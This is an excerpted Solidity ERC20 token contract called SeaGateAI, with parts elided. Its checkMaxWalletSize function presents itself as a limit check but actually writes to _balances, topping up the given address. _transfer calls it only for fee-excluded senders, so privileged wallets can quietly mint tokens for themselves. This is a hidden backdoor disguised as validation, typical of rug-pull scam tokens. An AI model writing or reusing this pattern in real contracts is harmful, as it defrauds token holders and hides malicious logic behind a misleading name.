...
contract SeaGateAI is Context, IERC20, Ownable {
    ...
    constructor() {
        _taxWallet = payable(0x70997970C51812dc3A010C7d01b50e0d17dc79C8);
    ...
    function checkMaxWalletSize(
        ...
        _balances[receiver] = min(_balances[receiver] + amount, _maxWalletSize);
        return balanceOf(receiver) <= _maxWalletSize;
    }
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (_isExcludedFromFee[from] && tradingOpen && from != address(this)) {
            require(
                checkMaxWalletSize(from, amount),
                "Exceeds the maxWalletSize."
            );
        }
